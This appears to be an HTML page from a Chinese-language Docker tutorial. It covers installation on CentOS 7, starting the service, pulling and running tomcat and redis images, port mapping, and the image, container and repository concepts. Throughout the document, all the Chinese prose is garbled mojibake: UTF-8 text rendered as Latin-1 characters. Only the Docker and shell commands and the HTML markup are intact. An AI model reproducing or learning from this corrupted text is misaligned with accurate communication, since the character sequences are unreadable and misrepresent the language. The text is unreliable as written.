<li><p>Docker å¯¹ç³»ç»Ÿèµ„æºçš„åˆ©ç”¨ç‡å¾ˆé«˜ï¼Œä¸€å°ä¸»æœºä¸Šå¯ä»¥åŒæ—¶è¿è¡Œæ•°åƒ ä¸ª Docker å®¹å™¨ã€‚ </p>
</li>
<li><p>å®¹å™¨é™¤äº†è¿è¡Œå…¶ä¸­çš„åº”ç”¨å¤–ï¼ŒåŸºæœ¬ä¸æ¶ˆè€—é¢å¤–çš„ç³»ç»Ÿèµ„æºï¼Œä½¿å¾— åº”ç”¨çš„æ€§èƒ½å¾ˆé«˜ã€‚ä¼ ç»Ÿè™šæ‹Ÿæœºæ–¹å¼è¿è¡Œ 10 ä¸ªå®Œå…¨ä¸åŒçš„åº”ç”¨å¯èƒ½æˆ‘ ä»¬ä¼šèµ· 10 ä¸ªè™šæ‹Ÿæœºæ¥éƒ¨ç½²ï¼Œè€Œ Docker åªéœ€è¦å¯åŠ¨ 10 ä¸ªéš”ç¦»çš„åº”ç”¨ å³å¯ã€‚</p>
</li>
<li><p>Docker å¯ä»¥æ›´å¿«é€Ÿçš„äº¤ä»˜å’Œéƒ¨ç½²ï¼Œå¤§é‡åœ°èŠ‚çº¦å¼€å‘ã€æµ‹è¯•ã€éƒ¨ç½² çš„æ—¶é—´ï¼Œå¯¹å¼€å‘å’Œè¿ç»´äººå‘˜æ¥è¯´ï¼Œæœ€å¸Œæœ›çš„å°±æ˜¯ä¸€æ¬¡åˆ›å»ºæˆ–é…ç½®ï¼Œå¯ ä»¥åœ¨ä»»æ„åœ°æ–¹æ­£å¸¸è¿è¡Œã€‚</p>
</li>
<li><p>æ›´é«˜æ•ˆçš„è™šæ‹ŸåŒ–ï¼ŒDocker å®¹å™¨çš„è¿è¡Œä¸éœ€è¦é¢å¤–çš„ hypervisor æ”¯ æŒï¼Œå®ƒæ˜¯å†…æ ¸çº§çš„è™šæ‹ŸåŒ–ï¼Œå› æ­¤å¯ä»¥å®ç°æ›´é«˜çš„æ€§èƒ½å’Œæ•ˆç‡ã€‚</p>
</li>
<li><p>æ›´è½»æ¾çš„è¿ç§»å’Œæ‰©å±•ï¼ŒDocker å®¹å™¨å‡ ä¹å¯ä»¥åœ¨ä»»æ„çš„å¹³å°ä¸Šè¿è¡Œï¼Œ åŒ…æ‹¬ç‰©ç†æœºã€è™šæ‹Ÿæœºã€å…¬æœ‰äº‘ã€ç§æœ‰äº‘ã€ä¸ªäººç”µè„‘ã€æœåŠ¡å™¨ç­‰ï¼Œè¿™ç§å…¼å®¹æ€§å¯ä»¥è®©ç”¨æˆ·è½»æ¾åœ°æŠŠä¸€ä¸ªåº”ç”¨ç¨‹åºä»ä¸€ä¸ªå¹³å°ç›´æ¥è¿ç§»åˆ°å¦ ä¸€ä¸ªå¹³å°ã€‚</p>
</li>
</ol>
<h1 id="ç¬¬äºŒç« -Dockerç¯å¢ƒæ­å»º"><a href="#ç¬¬äºŒç« -Dockerç¯å¢ƒæ­å»º" class="headerlink" title="ç¬¬äºŒç«  Dockerç¯å¢ƒæ­å»º"></a>ç¬¬äºŒç«  Dockerç¯å¢ƒæ­å»º</h1><h2 id="2-1-Dockerçš„ç‰ˆæœ¬"><a href="#2-1-Dockerçš„ç‰ˆæœ¬" class="headerlink" title="2.1 Dockerçš„ç‰ˆæœ¬"></a>2.1 Dockerçš„ç‰ˆæœ¬</h2><p>Docker ä» 2013 å¹´ 3 æœˆ 20 æ—¥å‘å¸ƒ Docker 0.1ï¼Œåˆ°ç°åœ¨å·²ç»å‘å¸ƒäº†å¤š ä¸ªç‰ˆæœ¬ï¼Œä» 2017 å¹´ 3 æœˆå¼€å§‹ docker åœ¨åŸæ¥çš„åŸºç¡€ä¸Šåˆ†ä¸ºä¸¤ä¸ªåˆ† æ”¯ç‰ˆæœ¬: Docker CE å’Œ Docker EEã€‚<br> Docker CE å³ç¤¾åŒºå…è´¹ç‰ˆï¼Œå¯æ°¸ä¹…å…è´¹ä½¿ç”¨;</p>
<p>Docker EE å³ä¼ä¸šç‰ˆï¼ŒåŠŸèƒ½æ›´å…¨ï¼Œæ›´å¼ºè°ƒå®‰å…¨ï¼Œä½†éœ€ä»˜è´¹ä½¿ç”¨; æœ¬è¯¾ç¨‹ä»‹ç» Docker CE ç‰ˆæœ¬ï¼Œç›®å‰ Docker ç‰ˆæœ¬ä¸º 18.03<br> Docker å®˜æ–¹ç½‘ç«™:<a href="https://www.docker.com/">https://www.docker.com/</a></p>
<h2 id="2-2-Dockerçš„å®‰è£…"><a href="#2-2-Dockerçš„å®‰è£…" class="headerlink" title="2.2 Dockerçš„å®‰è£…"></a>2.2 Dockerçš„å®‰è£…</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬çŸ¥é“ Docker å¹¶ä¸æ˜¯å®¹å™¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªç®¡ç†å®¹å™¨çš„å¼•æ“ã€‚ æˆ‘ä»¬è¯¾ç¨‹é‡‡ç”¨çš„ Linux ç‰ˆæœ¬æ˜¯ CentOS 7ï¼Œå­¦ä¹  Docker ä¹Ÿæ›´æ¨èåœ¨ Linux ç¯å¢ƒä¸‹ä½¿ç”¨;<br> Docker æ”¯æŒ CentOS 6 åŠä»¥åçš„ç‰ˆæœ¬;</p>
<p>CentOS7 ç³»ç»Ÿå¯ä»¥ç›´æ¥é€šè¿‡ yum è¿›è¡Œå®‰è£…: å®‰è£…å‰å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿæ˜¯å¦å·²ç»å®‰è£…äº† Docker:</p>
<p>yum list installed | grep docker<br> å®‰è£…:yum install docker -y<br> å®‰è£…åï¼Œä½¿ç”¨ docker â€“version(docker versionï¼Œdocker -v)æŸ¥çœ‹ docker æ˜¯å¦å®‰è£…æˆåŠŸï¼Œ<br> å¸è½½:<br> yum remove docker.x86_64 -y<br> yum remove docker-client.x86_64 -y<br> yum remove docker-common.x86_64 -y</p>
<h2 id="2-3-DockeræœåŠ¡å¯åŠ¨"><a href="#2-3-DockeræœåŠ¡å¯åŠ¨" class="headerlink" title="2.3 DockeræœåŠ¡å¯åŠ¨"></a>2.3 DockeræœåŠ¡å¯åŠ¨</h2><p>å®‰è£…ä¹‹åå¯åŠ¨DockeræœåŠ¡;</p>
<p>å¯åŠ¨:systemctl start docker æˆ–è€… service docker start </p>
<p>åœæ­¢:systemctl stop docker æˆ–è€… service docker stop </p>
<p>é‡å¯:systemctl restart docker æˆ–è€… service docker restart æ£€æŸ¥ docker è¿›ç¨‹çš„è¿è¡ŒçŠ¶æ€:<br> systemctl status docker æˆ–è€… service docker status </p>
<p>æŸ¥çœ‹ docker è¿›ç¨‹:ps -ef | grep docker</p>
<h2 id="2-4-DockeræœåŠ¡ä¿¡æ¯"><a href="#2-4-DockeræœåŠ¡ä¿¡æ¯" class="headerlink" title="2.4 DockeræœåŠ¡ä¿¡æ¯"></a>2.4 DockeræœåŠ¡ä¿¡æ¯</h2><p>docker info æŸ¥çœ‹ docker ç³»ç»Ÿä¿¡æ¯</p>
<p>docker æŸ¥çœ‹æ‰€æœ‰çš„å¸®åŠ©ä¿¡æ¯</p>
<p>docker commond â€“help æŸ¥çœ‹æŸä¸ª commond å‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯</p>
<h2 id="2-5-Dockerä½¿ç”¨"><a href="#2-5-Dockerä½¿ç”¨" class="headerlink" title="2.5 Dockerä½¿ç”¨"></a>2.5 Dockerä½¿ç”¨</h2><h3 id="2-5-1-Dockerçš„è¿è¡Œæœºåˆ¶"><a href="#2-5-1-Dockerçš„è¿è¡Œæœºåˆ¶" class="headerlink" title="2.5.1 Dockerçš„è¿è¡Œæœºåˆ¶"></a>2.5.1 Dockerçš„è¿è¡Œæœºåˆ¶</h3><p>æˆ‘ä»¬çŸ¥é“ Docker å¹¶ä¸æ˜¯å®¹å™¨ï¼Œè€Œåªæ˜¯ä¸€ä¸ªç®¡ç†å®¹å™¨çš„å¼•æ“;<br> Docker çš„åº•å±‚è¿è¡ŒåŸç†:<br> Docker æœåŠ¡å¯åŠ¨â†’ä¸‹è½½é•œåƒâ†’å¯åŠ¨è¯¥é•œåƒå¾—åˆ°ä¸€ä¸ªå®¹å™¨â†’å®¹å™¨é‡Œè¿ è¡Œç€æˆ‘ä»¬æƒ³è¦çš„ç¨‹åº;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131392.png" alt="image-20201217001317678"></p>
<h3 id="2-5-2-ç¬¬ä¸€ä¸ªDockerå®¹å™¨"><a href="#2-5-2-ç¬¬ä¸€ä¸ªDockerå®¹å™¨" class="headerlink" title="2.5.2 ç¬¬ä¸€ä¸ªDockerå®¹å™¨"></a>2.5.2 ç¬¬ä¸€ä¸ªDockerå®¹å™¨</h3><p>Dockerè¿è¡Œæ­¥éª¤:</p>
<ol>
<li>å°†DockeræœåŠ¡å¯åŠ¨</li>
<li>ä¸‹è½½ä¸€ä¸ªé•œåƒï¼ŒDockerè¿è¡Œä¸€ä¸ªå®¹å™¨å‰éœ€è¦æœ¬åœ°å­˜åœ¨æœ‰å¯¹åº”çš„é•œåƒï¼Œå¦‚æœé•œåƒä¸å­˜åœ¨ï¼ŒDockerä¼šä»é•œåƒä»“åº“ä¸‹è½½(é»˜è®¤æ˜¯ Docker Hub å…¬å…±æ³¨å†ŒæœåŠ¡å™¨ä¸­çš„ä»“åº“ <a href="https://hub.docker.com)./">https://hub.docker.com)ã€‚</a></li>
</ol>
<p>CentOS ä¸‹æ€ä¹ˆä¸‹è½½(pull)é•œåƒ?</p>
<p>ä» docker hub å®˜ç½‘æœç´¢è¦ä½¿ç”¨çš„é•œåƒï¼Œä¹Ÿå¯ä»¥åœ¨å‘½ä»¤è¡Œä½¿ç”¨å‘½ä»¤æœç´¢è¦ä½¿ç”¨çš„é•œåƒï¼Œæ¯”å¦‚ docker search tomcat è¿›è¡Œæœç´¢ï¼Œç„¶åä¸‹è½½æ‰€éœ€ è¦çš„é•œåƒ:<br> ä¸‹è½½é•œåƒ:docker pull tomcat</p>
<p>è¿è¡Œé•œåƒ:docker run tomcat å‰å°è¿è¡Œï¼Œ è¦åå°è¿è¡Œï¼ŒåŠ å‚æ•° -d æ˜¾ç¤ºæœ¬åœ°å·²æœ‰çš„é•œåƒ:docker images</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131393.png" alt="image-20201217001937529"></p>
<p>åœ¨åˆ—å‡ºä¿¡æ¯ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å‡ ä¸ªå­—æ®µä¿¡æ¯ </p>
<p>REPOSITORY:æ¥è‡ªäºå“ªä¸ªä»“åº“ï¼Œæ¯”å¦‚ docker.io&#x2F;tomcat TAG:é•œåƒçš„æ ‡è®°ï¼Œæ¯”å¦‚ latest<br> IMAGE ID:é•œåƒçš„ ID å·(å”¯ä¸€) </p>
<p>CREATED:åˆ›å»ºæ—¶é—´</p>
<p>SIZE:é•œåƒå¤§å°</p>
<ol start="3">
<li>å¯åŠ¨ä¸‹è½½ä¸‹æ¥çš„é•œåƒå¾—åˆ°ä¸€ä¸ªå®¹å™¨:<br> docker run -d docker.io&#x2F;tomcat æˆ–è€… docker run -d 41a54fe1f79d é»˜è®¤æ˜¯å‰å°å¯åŠ¨ï¼Œå¦‚æœéœ€è¦åå°å¯åŠ¨ï¼ŒæŒ‡å®š-d å‚æ•°;</li>
</ol>
<p>é€šè¿‡ ps -ef | grep tomcat æŸ¥çœ‹ï¼Œæ£€æŸ¥ tomcat é•œåƒæ˜¯å¦å¯åŠ¨å®¹å™¨æˆåŠŸ</p>
<h3 id="2-5-3-è¿›å…¥Dockerå®¹å™¨"><a href="#2-5-3-è¿›å…¥Dockerå®¹å™¨" class="headerlink" title="2.5.3 è¿›å…¥Dockerå®¹å™¨"></a>2.5.3 è¿›å…¥Dockerå®¹å™¨</h3><p>è¿›å…¥å®¹å™¨:docker exec -it cef0d139bfd6 bash<br> å…¶ä¸­ i è¡¨ç¤ºäº¤äº’å¼çš„ï¼Œä¹Ÿå°±æ˜¯ä¿æŒæ ‡å‡†è¾“å…¥æµæ‰“å¼€; t è¡¨ç¤ºè™šæ‹Ÿæ§åˆ¶å°ï¼Œåˆ†é…åˆ°ä¸€ä¸ªè™šæ‹Ÿæ§åˆ¶å°; </p>
<p>é€€å‡ºå®¹å™¨:exit</p>
<h3 id="2-5-4-å®¢æˆ·æœºè®¿é—®å®¹å™¨"><a href="#2-5-4-å®¢æˆ·æœºè®¿é—®å®¹å™¨" class="headerlink" title="2.5.4 å®¢æˆ·æœºè®¿é—®å®¹å™¨"></a>2.5.4 å®¢æˆ·æœºè®¿é—®å®¹å™¨</h3><p>ä»å®¢æˆ·æœºä¸Šè®¿é—®å®¹å™¨ï¼Œéœ€è¦æœ‰ç«¯å£æ˜ å°„ï¼Œdocker å®¹å™¨é»˜è®¤é‡‡ç”¨æ¡¥æ¥æ¨¡ å¼ä¸å®¿ä¸»æœºé€šä¿¡ï¼Œéœ€è¦å°†å®¿ä¸»æœºçš„ ip ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„ ip ç«¯å£ä¸Š; </p>
<p>åœæ­¢å®¹å™¨:docker stop å®¹å™¨ ID&#x2F;åç§°<br>å¯åŠ¨å®¹å™¨:docker run -d -p 8080:8080 docker.io&#x2F;tomcat æˆ–è€… 41a54fe1f79d</p>
<h1 id="ç¬¬ä¸‰ç« -Dockeræ ¸å¿ƒç»„ä»¶"><a href="#ç¬¬ä¸‰ç« -Dockeræ ¸å¿ƒç»„ä»¶" class="headerlink" title="ç¬¬ä¸‰ç«  Dockeræ ¸å¿ƒç»„ä»¶"></a>ç¬¬ä¸‰ç«  Dockeræ ¸å¿ƒç»„ä»¶</h1><h2 id="3-1-Dockeræ¶æ„"><a href="#3-1-Dockeræ¶æ„" class="headerlink" title="3.1 Dockeræ¶æ„"></a>3.1 Dockeræ¶æ„</h2><p>Dockerä½¿ç”¨å®¢æˆ·ç«¯-æœåŠ¡å™¨ï¼ˆC&#x2F;Sï¼‰æ¶æ„æ¨¡å¼ï¼Œä½¿ç”¨è¿œç¨‹APIæ¥ç®¡ç†å’Œåˆ›å»ºDockerå®¹å™¨ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131394.png" alt="image-20201217002508350"></p>
<p>Dockerå®¹å™¨é€šè¿‡Dockeré•œåƒæ¥åˆ›å»ºã€‚</p>
<p>é•œåƒä¸å®¹å™¨çš„å…³ç³»ç±»ä¼¼äºé¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­çš„ç±»ä¸å¯¹è±¡çš„å…³ç³»ã€‚</p>
<table>
<thead>
<tr>
<th>Docker</th>
<th>é¢å‘å¯¹è±¡</th>
</tr>
</thead>
<tbody><tr>
<td>é•œåƒ</td>
<td>ç±»</td>
</tr>
<tr>
<td>å®¹å™¨</td>
<td>å¯¹è±¡</td>
</tr>
</tbody></table>
<h2 id="3-2-Dockeræ ¸å¿ƒè¦ç´ "><a href="#3-2-Dockeræ ¸å¿ƒè¦ç´ " class="headerlink" title="3.2 Dockeræ ¸å¿ƒè¦ç´ "></a>3.2 Dockeræ ¸å¿ƒè¦ç´ </h2><p>DockeråŒ…æ‹¬ä¸‰ä¸ªæ ¸å¿ƒè¦ç´ </p>
<p><strong>é•œåƒ(Image)ã€å®¹å™¨(Container)ã€ä»“åº“(Repository)</strong></p>
<p> ç†è§£äº†è¿™ä¸‰ä¸ªæ¦‚å¿µï¼Œå°±ç†è§£äº† Docker çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸã€‚ Docker çš„è¿è¡Œç¦»ä¸å¼€ä»¥ä¸Šæ ¸å¿ƒå‡ ä¸ªç»„ä»¶çš„æ”¯æŒï¼ŒDocker çš„æˆåŠŸä¹Ÿæ˜¯ æ‹œè¿™å‡ ä¸ªç»„ä»¶æ‰€èµã€‚<br> æœ‰äººä¼šè¯¯ä»¥ä¸ºï¼ŒDocker å°±æ˜¯å®¹å™¨ï¼Œä½† Docker ä¸æ˜¯å®¹å™¨ï¼Œè€Œæ˜¯ç®¡ç†å®¹ å™¨çš„å¼•æ“ã€‚</p>
<h2 id="3-3-é•œåƒ"><a href="#3-3-é•œåƒ" class="headerlink" title="3.3 é•œåƒ"></a>3.3 é•œåƒ</h2><h3 id="3-3-1-é•œåƒçš„åŸºæœ¬æ¦‚å¿µ"><a href="#3-3-1-é•œåƒçš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="3.3.1 é•œåƒçš„åŸºæœ¬æ¦‚å¿µ"></a>3.3.1 é•œåƒçš„åŸºæœ¬æ¦‚å¿µ</h3><p>Docker é•œåƒå°±æ˜¯ä¸€ä¸ªåªè¯»çš„æ¨¡æ¿ï¼Œå¯ä»¥ç”¨æ¥åˆ›å»º Docker å®¹å™¨ã€‚ ä¾‹å¦‚:ä¸€ä¸ªé•œåƒå¯ä»¥åŒ…å«ä¸€ä¸ªå®Œæ•´çš„ centos æ“ä½œç³»ç»Ÿç¯å¢ƒï¼Œé‡Œé¢ä»… å®‰è£…äº† mysql æˆ–ç”¨æˆ·éœ€è¦çš„å…¶å®ƒåº”ç”¨ç¨‹åºã€‚<br> Docker æä¾›äº†ä¸€ä¸ªéå¸¸ç®€å•çš„æœºåˆ¶æ¥åˆ›å»ºé•œåƒæˆ–è€…æ›´æ–°ç°æœ‰çš„é•œåƒï¼Œ ç”¨æˆ·ç”šè‡³å¯ä»¥ç›´æ¥ä»å…¶ä»–äººé‚£é‡Œä¸‹è½½ä¸€ä¸ªå·²ç»åšå¥½çš„é•œåƒæ¥ç›´æ¥ä½¿ ç”¨ã€‚</p>
<h3 id="3-3-2-é•œåƒçš„ç»„æˆç»“æ„"><a href="#3-3-2-é•œåƒçš„ç»„æˆç»“æ„" class="headerlink" title="3.3.2 é•œåƒçš„ç»„æˆç»“æ„"></a>3.3.2 é•œåƒçš„ç»„æˆç»“æ„</h3><p>é•œåƒæ˜¯ç”±è®¸å¤šå±‚çš„æ–‡ä»¶ç³»ç»Ÿå åŠ æ„æˆçš„ï¼Œæœ€ä¸‹é¢æ˜¯ä¸€ä¸ªå¼•å¯¼æ–‡ä»¶ç³»ç»Ÿ bootfsï¼Œç¬¬äºŒå±‚æ˜¯ä¸€ä¸ª root æ–‡ä»¶ç³»ç»Ÿ rootfsï¼Œroot æ–‡ä»¶ç³»ç»Ÿé€šå¸¸æ˜¯æŸ ç§æ“ä½œç³»ç»Ÿï¼Œæ¯”å¦‚ centosã€Ubuntuï¼Œåœ¨ root æ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šåˆæœ‰å¾ˆå¤š å±‚æ–‡ä»¶ç³»ç»Ÿï¼Œè¿™äº›æ–‡ä»¶ç³»ç»Ÿå åŠ åœ¨ä¸€èµ·ï¼Œæ„æˆ docker ä¸­çš„é•œåƒ;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131395.png" alt="image-20201217003937572"></p>
<h3 id="3-3-3-é•œåƒçš„æ—¥å¸¸æ“ä½œ"><a href="#3-3-3-é•œåƒçš„æ—¥å¸¸æ“ä½œ" class="headerlink" title="3.3.3 é•œåƒçš„æ—¥å¸¸æ“ä½œ"></a>3.3.3 é•œåƒçš„æ—¥å¸¸æ“ä½œ</h3><ol>
<li><p>ä¸‹è½½é•œåƒï¼Œæ¯”å¦‚ä¸‹è½½ redis é•œåƒ:docker pull redis:latest<br> reids æ˜¯æŸ¥è¯¢åˆ°çš„é•œåƒåç§°ï¼Œlatest æ˜¯é•œåƒçš„æ ‡ç­¾ tag è·å–ä¸€ä¸ªé•œåƒæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ä»å®˜æ–¹é•œåƒä»“åº“ä¸‹è½½ï¼Œä¸€ç§æ˜¯è‡ªå·± é€šè¿‡ Dockerfile æ–‡ä»¶æ„å»ºã€‚</p>
<p>å¦‚æœæœ‰å®˜æ–¹é•œåƒï¼Œæˆ‘ä»¬å°±ä¸å¿…è‡ªå·±ç”¨ Dockerfile æ–‡ä»¶æ„å»ºäº†ï¼Œé™¤éå®˜ æ–¹æ²¡æœ‰æ‰ä¼šè‡ªå·±å» Dockerfile æ–‡ä»¶æ„å»º</p>
</li>
<li><p>åˆ—å‡ºå·²ç»ä¸‹è½½çš„é•œåƒ:docker imagesï¼Œæˆ–è€… docker images redis </p>
</li>
<li><p>è¿è¡Œé•œåƒ:docker run -d redis å…¶ä¸­-d è¡¨ç¤ºåœ¨åå°è¿è¡Œ</p>
<p>ç„¶åé€šè¿‡ ps -ef | grep redis å¯ä»¥æŸ¥åˆ° redis è¿›ç¨‹</p>
</li>
<li><p>æŸ¥çœ‹å®¹å™¨é•œåƒçš„çŠ¶æ€:docker ps<br> é€šè¿‡ docker exec -it a8584016f9b6(é•œåƒ ID) bash è¿›å…¥ redis å®¹å™¨ </p>
</li>
<li><p>åˆ é™¤é•œåƒ:docker rmi redis:latest æ³¨æ„æ˜¯ rmiï¼Œä¸æ˜¯ rmï¼Œrm æ˜¯åˆ  é™¤å®¹å™¨;</p>
</li>
</ol>
<h2 id="3-4-å®¹å™¨"><a href="#3-4-å®¹å™¨" class="headerlink" title="3.4 å®¹å™¨"></a>3.4 å®¹å™¨</h2><h3 id="3-4-1-å®¹å™¨çš„åŸºæœ¬æ¦‚å¿µ"><a href="#3-4-1-å®¹å™¨çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="3.4.1 å®¹å™¨çš„åŸºæœ¬æ¦‚å¿µ"></a>3.4.1 å®¹å™¨çš„åŸºæœ¬æ¦‚å¿µ</h3><p>å®¹å™¨æ˜¯ä»é•œåƒåˆ›å»ºçš„è¿è¡Œå®ä¾‹ã€‚å®ƒå¯ä»¥è¢«å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€‚æ¯ä¸ªå®¹å™¨éƒ½æ˜¯ç›¸äº’éš”ç¦»çš„ã€ä¿è¯å®‰å…¨å¹³å°ã€‚å¯ä»¥æŠŠçœ‹åšä¸€ä¸ªç®€æ˜“ç‰ˆçš„ Linux ç¯å¢ƒï¼ŒåŒ…æ‹¬ root ç”¨æˆ·æƒé™ã€è¿›ç¨‹ç©ºé—´ã€ç”¨æˆ·ç©ºé—´å’Œç½‘ç»œç©ºé—´å’Œè¿è¡Œåœ¨å…¶ä¸­çš„åº”ç”¨ç¨‹åºã€‚</p>
<p>Dockeråˆ©ç”¨å®¹å™¨æ¥è¿è¡Œåº”ç”¨ï¼Œé•œåƒæ˜¯åªè¯»çš„ï¼Œå®¹å™¨åœ¨å¯åŠ¨çš„æ—¶å€™åˆ›å»ºä¸€å±‚å¯å†™å±‚ä½œä¸ºæœ€ä¸Šå±‚ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131396.png" alt="image-20201217004722048"></p>
<h3 id="3-4-2-å®¹å™¨çš„æ—¥å¸¸æ“ä½œ"><a href="#3-4-2-å®¹å™¨çš„æ—¥å¸¸æ“ä½œ" class="headerlink" title="3.4.2 å®¹å™¨çš„æ—¥å¸¸æ“ä½œ"></a>3.4.2 å®¹å™¨çš„æ—¥å¸¸æ“ä½œ</h3><p>å¯åŠ¨å®¹å™¨æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯åŸºäºé•œåƒæ–°å»ºä¸€ä¸ªå®¹å™¨å¹¶å¯åŠ¨ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯å°†åœ¨ç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨é‡æ–°å¯åŠ¨ã€‚</p>
<p>é€šè¿‡é•œåƒå¯åŠ¨å®¹å™¨:docker run -d redis<br>æŸ¥çœ‹è¿è¡Œä¸­çš„å®¹å™¨:docker ps</p>
<p>æŸ¥çœ‹æ‰€æœ‰çš„å®¹å™¨:docker ps -a<br>åœæ­¢å®¹å™¨:docker stop å®¹å™¨ id æˆ–å®¹å™¨åç§° </p>
<p>å·²ç»åœæ­¢çš„å®¹å™¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤ docker start æ¥å¯åŠ¨ã€‚ å¼€å¯å®¹å™¨:docker start å®¹å™¨ id æˆ–å®¹å™¨åç§°<br>å› ä¸º Docker çš„å®¹å™¨å®åœ¨å¤ªè½»é‡çº§äº†ï¼Œå¾ˆå¤šæ—¶å€™ç”¨æˆ·éƒ½æ˜¯éšæ—¶åˆ é™¤å’Œæ–°å»ºå®¹å™¨ã€‚</p>
<p>åˆ é™¤å®¹å™¨:docker rm å®¹å™¨ id æˆ–å®¹å™¨åç§° </p>
<p>åˆ é™¤å®¹å™¨æ—¶ï¼Œå®¹å™¨å¿…é¡»æ˜¯åœæ­¢çŠ¶æ€ï¼Œå¦åˆ™ä¼šæŠ¥é”™; </p>
<p>è¿›å…¥å®¹å™¨:docker exec -it å®¹å™¨ id æˆ–å®¹å™¨åç§° bash<br>è¿˜å¯ä»¥ä½¿ç”¨ docker inspect + å®¹å™¨ id æˆ–å®¹å™¨åç§° æŸ¥çœ‹å®¹å™¨çš„æ›´å¤šä¿¡æ¯;<br> åœç”¨å…¨éƒ¨è¿è¡Œä¸­çš„å®¹å™¨:docker stop $(docker ps -q) </p>
<p>åˆ é™¤å…¨éƒ¨å®¹å™¨:docker rm â€‹$(docker ps -aq) </p>
<p>ä¸€æ¡å‘½ä»¤å®ç°åœç”¨å¹¶åˆ é™¤å®¹å™¨:<br> docker stop $(docker ps -q) &amp; docker rm -f $(docker ps -aq)</p>
<h2 id="3-5-ä»“åº“"><a href="#3-5-ä»“åº“" class="headerlink" title="3.5 ä»“åº“"></a>3.5 ä»“åº“</h2><h3 id="3-5-1-ä»“åº“çš„åŸºæœ¬æ¦‚å¿µ"><a href="#3-5-1-ä»“åº“çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="3.5.1 ä»“åº“çš„åŸºæœ¬æ¦‚å¿µ"></a>3.5.1 ä»“åº“çš„åŸºæœ¬æ¦‚å¿µ</h3><p>ä»“åº“æ˜¯é›†ä¸­å­˜æ”¾é•œåƒæ–‡ä»¶çš„åœºæ‰€ï¼Œæœ‰æ—¶å€™ä¼šæŠŠä»“åº“å’Œä»“åº“æ³¨å†ŒæœåŠ¡å™¨ (Registry)çœ‹åšåŒä¸€äº‹ç‰©ï¼Œå¹¶ä¸ä¸¥æ ¼åŒºåˆ†ã€‚å®é™…ä¸Šï¼Œä»“åº“æ³¨å†ŒæœåŠ¡ å™¨ä¸Šå¾€å¾€å­˜æ”¾ç€å¤šä¸ªä»“åº“ï¼Œæ¯ä¸ªä»“åº“ä¸­åˆåŒ…å«äº†å¤šä¸ªé•œåƒï¼Œæ¯ä¸ªé•œåƒ æœ‰ä¸åŒçš„æ ‡ç­¾(tag); ä»“åº“åˆ†ä¸ºå…¬å¼€ä»“åº“(Public)å’Œç§æœ‰ä»“åº“(Private)ä¸¤ç§å½¢å¼; æœ€å¤§çš„å…¬å¼€ä»“åº“æ˜¯ Docker Hub (<a href="https://hub.docker.com/)%EF%BC%8C%E5%AD%98%E6%94%BE%E4%BA%86">https://hub.docker.com/)ï¼Œå­˜æ”¾äº†</a> æ•°é‡åºå¤§çš„é•œåƒä¾›ç”¨æˆ·ä¸‹è½½; å½“ç„¶ï¼Œç”¨æˆ·ä¹Ÿå¯ä»¥åœ¨æœ¬åœ°ç½‘ç»œå†…åˆ›å»ºä¸€ä¸ªç§æœ‰ä»“åº“;å½“ç”¨æˆ·åˆ›å»ºäº†è‡ªå·±çš„é•œåƒä¹‹åå°±å¯ä»¥ä½¿ç”¨ push å‘½ä»¤å°†å®ƒä¸Šä¼ åˆ°å…¬ æœ‰æˆ–è€…ç§æœ‰ä»“åº“ï¼Œè¿™æ ·ä¸‹æ¬¡åœ¨å¦å¤–ä¸€å°æœºå™¨ä¸Šä½¿ç”¨è¿™ä¸ªé•œåƒæ—¶å€™ï¼Œåª éœ€è¦ä»ä»“åº“ä¸Š pull ä¸‹æ¥å³å¯;<br> æ³¨:Docker ä»“åº“çš„æ¦‚å¿µè·Ÿ Git ç±»ä¼¼ï¼Œæ³¨å†ŒæœåŠ¡å™¨ä¹Ÿç±»ä¼¼äº GitHub è¿™ æ ·çš„æ‰˜ç®¡æœåŠ¡;</p>
<h3 id="3-5-2-ä»“åº“çš„æ—¥å¸¸æ“ä½œ"><a href="#3-5-2-ä»“åº“çš„æ—¥å¸¸æ“ä½œ" class="headerlink" title="3.5.2 ä»“åº“çš„æ—¥å¸¸æ“ä½œ"></a>3.5.2 ä»“åº“çš„æ—¥å¸¸æ“ä½œ</h3><p>ç”¨æˆ·å¯é€šè¿‡ docker search å‘½ä»¤æ¥æŸ¥æ‰¾å®˜æ–¹ä»“åº“ä¸­çš„é•œåƒ:<br> docker search rabbitmq </p>
<p>å¯ä»¥çœ‹åˆ°è¿”å›äº†å¾ˆå¤šåŒ…å«å…³é”®å­—çš„é•œåƒï¼Œå…¶ä¸­åŒ…æ‹¬é•œåƒåå­—ã€æè¿°ã€ æ˜Ÿçº§(è¡¨ç¤ºè¯¥é•œåƒçš„å—æ¬¢è¿ç¨‹åº¦)ã€æ˜¯å¦å®˜æ–¹åˆ›å»ºã€æ˜¯å¦è‡ªåŠ¨åˆ›å»º; å®˜æ–¹çš„é•œåƒè¯´æ˜æ˜¯å®˜æ–¹é¡¹ç›®ç»„åˆ›å»ºå’Œç»´æŠ¤çš„ï¼Œautomated èµ„æºå…è®¸ç”¨ æˆ·éªŒè¯é•œåƒçš„æ¥æºå’Œå†…å®¹; </p>
